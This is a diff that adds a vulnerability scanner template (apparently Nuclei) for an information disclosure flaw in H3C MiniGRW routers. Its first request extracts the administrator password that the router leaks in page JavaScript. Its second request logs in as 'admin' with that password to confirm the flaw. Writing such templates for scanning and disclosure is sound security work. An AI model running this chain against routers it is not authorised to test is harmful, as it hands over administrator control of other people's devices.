@@ -1,0 +1,42 @@
+id: h3c-minigrw-info-disclosure
+info:
+  name: H3C MiniGRW Web Router Information Disclosure
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    H3C MiniGRW Web Router has a vulnerability where the /userLogin.asp page leaks the administrator account password.
+  reference:
+    - https://fofa.so/
+  tags: information-disclosure, router
+http:
+  - raw:
+      - |
+        GET / HTTP/1.1
+        Host: {{Hostname}}
+    extractors:
+      - type: regex
+        name: password_prompt
+        internal: true
+        group: 1
+        regex:
+          - "var sys_passwd_prompt =\"(.*?)\";"
+    matchers:
+      - type: word
+        words:
+          - "sys_passwd_prompt"
+  - raw:
+      - |
+        POST /userLogin.asp HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        Referer: {{BaseURL}}/userLogin.asp
+
+        save2Cookie=&vldcode=&account=admin&password={{password_prompt}}&btnSubmit=+%B5%C7%C2%BC+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "系统登录中..."
